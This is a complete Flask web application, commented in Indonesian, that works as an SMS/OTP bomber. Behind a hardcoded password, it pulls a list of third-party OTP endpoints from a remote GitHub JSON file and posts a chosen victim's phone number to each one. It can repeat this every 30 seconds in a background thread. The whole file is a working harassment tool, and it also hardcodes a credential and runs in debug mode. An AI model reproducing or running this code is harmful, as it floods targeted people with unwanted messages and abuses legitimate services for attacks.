from flask import Flask, render_template, request, redirect, url_for, flash
import requests
import threading
import time

app = Flask(__name__)
app.secret_key = 'your_secret_key'

# Password yang diizinkan
ALLOWED_PASSWORD = 'cl4ire'

# URL GitHub Raw untuk file JSON konfigurasi OTP
JSON_CONFIG_URL = "https://raw.githubusercontent.com/YoshCasaster/verifikasi-sotp/main/otp_config.json"

# Variabel untuk kontrol looping
loop_running = False

# Fungsi untuk mengirim OTP
def send_otp_requests(phone_number):
    responses = []
    try:
        response = requests.get(JSON_CONFIG_URL)
        config = response.json()

        for item in config:
            api_url = item.get("url")
            data = item.get("data").replace("target_number", phone_number)
            headers = item.get("headers")
            response = requests.post(api_url, headers=headers, data=data)
            responses.append(response.text)
        return responses
    except Exception as e:
        return [f"Gagal mengambil konfigurasi OTP: {e}"]

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        password = request.form['password']
        if password == ALLOWED_PASSWORD:
            return render_template('home.html', key_valid=True)  # Tampilkan halaman utama
        else:
            flash('Password salah, silakan coba lagi.')
            return redirect(url_for('home'))

    return render_template('login.html')  # Tampilkan halaman login

@app.route('/otp', methods=['POST'])
def otp():
    global loop_running
    phone_number = request.form['phone']
    
    if 'send_loop' in request.form:
        if not loop_running:  # Cek apakah loop sudah berjalan
            threading.Thread(target=send_loop, args=(phone_number,), daemon=True).start()
            flash('Pengiriman OTP terus menerus dimulai.')
    else:
        otp_responses = send_otp_requests(phone_number)
        flash('OTP telah terkirim: ' + ', '.join(otp_responses))

    return redirect(url_for('home'))  # Pastikan kembali ke halaman home

def send_loop(phone_number):
    global loop_running
    loop_running = True
    while loop_running:
        otp_responses = send_otp_requests(phone_number)
        # Simpan atau tampilkan respons jika perlu
        time.sleep(30)  # Tunggu 30 detik sebelum mengirim OTP lagi

@app.route('/stop', methods=['POST'])
def stop():
    global loop_running
    loop_running = False
    flash('Pengiriman OTP dihentikan.')
    return redirect(url_for('home'))

if __name__ == '__main__':
    app.run(debug=True)
